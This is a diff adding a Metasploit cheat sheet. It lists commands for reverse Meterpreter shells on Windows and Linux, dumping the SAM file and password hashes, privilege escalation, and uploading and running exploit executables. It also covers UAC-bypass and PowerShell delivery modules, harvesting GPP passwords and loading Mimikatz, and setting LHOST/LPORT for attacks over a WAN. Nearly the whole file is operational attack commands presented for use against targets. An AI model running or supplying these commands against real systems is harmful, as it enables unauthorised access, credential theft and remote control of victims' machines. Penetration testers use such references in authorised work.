@@ -1,0 +1,77 @@
+
+
+#!!!Metasploiit commands:
+
+------->Windows reverse meterpreter payload:
+	 _______________________________________________________________________________
+	|  command				     |		Description		|
+	|					     |					|
+	|set payload windows/meterpreter/reverse_tcp |	Windows reverse tcp payload	|
+	|____________________________________________|__________________________________|
+
+------->Windows VNC Meterpreter payload
+	 _______________________________________________________________________________________________
+	|							     |					|
+	|set payload windows/vncinject/reverse_tcpset ViewOnly false |	Meterpreter Windows VNC Payload |
+	|____________________________________________________________|__________________________________|
+
+------->Linux Reverse Meterpreter payload
+	 ___________________________________________________________________________________
+	|set payload linux/meterpreter/reverse_tcp	| Meterpreter Linux Reverse Payload |
+	|_______________________________________________|___________________________________|
+
+	COMMAND								DESCRIPTION
+	------------------------------------------------|-----------------------------------------
+	upload file c:\\windows	Meterpreter 		|	upload file to Windows target
+	download c:\\windows\\repair\\sam /tmp		|	Meterpreter download file from Windows target
+	download c:\\windows\\repair\\sam /tmp		|	Meterpreter download file from Windows target
+	execute -f c:\\windows\temp\exploit.exe		|	Meterpreter run .exe on target – handy for executing uploaded exploits
+	execute -f cmd -c				|	Creates new channel with cmd shell
+	ps						|	Meterpreter show processes
+	shell						|	Meterpreter get shell on the target
+	getsystem					|	Meterpreter attempts priviledge escalation the target
+	hashdump					|	Meterpreter attempts to dump the hashes on the target
+	portfwd add –l 3389 –p 3389 –r target		|	Meterpreter create port forward to target machine
+	portfwd delete –l 3389 –p 3389 –r target	|	Meterpreter delete port forward
+
+
+------->Local Windows Metasploit Modules (exploits)
+
+		COMMAND						DESCRIPTION
+	use exploit/windows/local/bypassuac	Bypass UAC on Windows 7 + Set target + arch, x86/64
+
+	------->Metasploit Powershell Modules:
+			COMMAND						 	DESCRIPTION
+		-----------------------------------------------|------------------------------------
+		use exploit/multi/script/web_delivery	       |	Metasploit powershell payload delivery module
+		post/windows/manage/powershell/exec_powershell |	Metasploit upload and run powershell script through a session
+		use exploit/multi/http/jboss_maindeployer      |	Metasploit JBOSS deploy
+		use exploit/windows/mssql/mssql_payload	       |	Metasploit MSSQL payload
+		------------------------------------------------------------------------------------
+	-------->Post Exploit Windows Metasploit Modules
+				COMMAND						DESCRIPTION
+			------------------------------------------------|---------------------------------------------------------
+			run post/windows/gather/win_privs		|   Metasploit show privileges of current user
+			use post/windows/gather/credentials/gpp		|   Metasploit grab GPP saved passwords
+			load mimikatz -> wdigest			|   Metasplit load Mimikatz
+			run post/windows/gather/local_admin_search_enum	|   Idenitfy other machines that the supplied domain user has
+									|	 administrative access to
+------>These are the basic Metasploit Commands!
+	[*]search
+	[*]info
+	[*]show options
+LHOST: Use Local IP Address|If your attacking on WAN network you need to set LHOST to static IP Address IP and port forward
+
+LPORT: If your attacking in LAN Network then you don’t need to port forward use any port you want.
+If your attacking on WAN Network then you have to port forward that port.
+[*]Show Payloads
+[*]Show targets
+[*]Show advanced
+[*]Show encoders
+[*]Show nops
+
+
+
+
+
+
